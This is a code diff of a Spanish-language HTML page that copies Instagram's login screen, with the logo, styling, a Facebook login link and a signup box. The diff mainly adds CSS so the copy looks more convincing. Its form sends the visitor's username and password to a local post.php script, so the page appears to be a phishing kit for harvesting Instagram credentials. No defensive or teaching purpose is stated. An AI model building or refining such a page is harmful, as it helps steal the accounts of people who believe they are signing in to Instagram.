@@ -3,41 +3,284 @@
 
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Instagram</title>
-    <link rel="stylesheet" href="/estilos.css" />
+
+    <!-- Fuente para el logo tipo Instagram -->
+    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
+
+    <style>
+        /* Reset básico */
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial,
+                sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+        }
+
+        a {
+            text-decoration: none;
+            color: #0095f6;
+            cursor: pointer;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            gap: 60px;
+            padding: 20px;
+        }
+
+        /* Imagen solo visible en pantallas grandes */
+        .image-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 600px;
+        }
+
+        .image-container img {
+            width: 550px;
+            height: 618px;
+            object-fit: contain;
+            user-select: none;
+        }
+
+        /* Ocultar imagen en móviles */
+        @media (max-width: 900px) {
+            .image-container {
+                display: none;
+            }
+        }
+
+        .form-container {
+            flex: 1;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Caja del formulario principal */
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 40px 30px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Logo Instagram */
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 60px;
+            margin-bottom: 30px;
+            user-select: none;
+            color: #262626;
+        }
+
+        /* Inputs */
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            border-radius: 3px;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background-color: #fff;
+        }
+
+        /* Botón Iniciar sesión */
+        button[type="submit"] {
+            margin-top: 8px;
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 8px 0;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #007dc1;
+        }
+
+        /* Divisor con línea y "o" centrado */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 18px;
+        }
+
+        .divider::after {
+            margin-left: 18px;
+        }
+
+        .divider span {
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+
+        /* Login con Facebook */
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            user-select: none;
+        }
+
+        .facebook-login:hover {
+            text-decoration: underline;
+        }
+
+        .facebook-login img {
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+            filter: invert(25%) sepia(96%) saturate(3200%) hue-rotate(204deg) brightness(90%) contrast(97%);
+            /* Ajusta para que sea azul Facebook */
+        }
+
+        /* Olvidaste tu contraseña */
+        .forgot {
+            font-size: 12px;
+            color: #00376b;
+            margin-top: 12px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        /* Caja registro */
+        .signup-box {
+            margin-top: 5px;
+            padding: 20px 20px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            user-select: none;
+        }
+        footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            user-select: none;
+            line-height: 1.4;
+        }
+
+        footer div {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        footer a {
+            color: #8e8e8e;
+            font-weight: 600;
+            transition: color 0.2s ease;
+        }
+
+        footer a:hover {
+            color: #262626;
+            text-decoration: underline;
+        }
+
+        footer select {
+            margin-top: 10px;
+            padding: 4px 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: white;
+            font-size: 12px;
+            cursor: pointer;
+            user-select: none;
+        }
+    </style>
 </head>
 
 <body>
 
-    <form method="post" action="post.php">
-        <div class="login-container">
-            <img src="/assets/logo_insta.png" alt="Instagram Logo" width="200" />
-
-            <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required />
-            <input type="password" name="password" placeholder="Contraseña" required />
-            <button type="submit">Iniciar sesión</button>
-
-            <div class="divider"><span>o</span></div>
-
-            <div class="facebook-login">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
-                    alt="Facebook Logo">
-                Iniciar sesión con Facebook
-            </div>
-            <div class="forgot">¿Olvidaste tu contraseña?</div>
+    <div class="main-container">
+        <div class="image-container">
+            <img src="/assets/fondo.png" alt="Instagram Preview" />
         </div>
-    </form>
 
-    <div class="signup-box">
-        ¿No tienes una cuenta? <a href="#">Regístrate</a>
-    </div>
+        <div class="form-container">
+            <div class="login-container">
+                <img src="/assets/logo_insta.png" alt="Instagram Logo" width="200" />
 
-    <div class="download">
-        Descarga la app.
-        <div class="store-buttons">
-            <img src="/assets/logo_googleplay.png" alt="Google Play" />
-            <img src="/assets/logo_microsoft.png "alt="Microsoft Store" />
+                <form method="post" action="post.php">
+                    <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required />
+                    <input type="password" name="password" placeholder="Contraseña" required />
+                    <button type="submit">Iniciar sesión</button>
+                </form>
+
+                <div class="divider"><span>o</span></div>
+
+                <div class="facebook-login">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
+                        alt="Facebook Logo" />
+                    Iniciar sesión con Facebook
+                </div>
+
+                <div class="forgot">¿Olvidaste tu contraseña?</div>
+            </div>
+
+            <div class="signup-box">
+                ¿No tienes una cuenta? <a href="#">Regístrate</a>
+            </div>
         </div>
     </div>
 
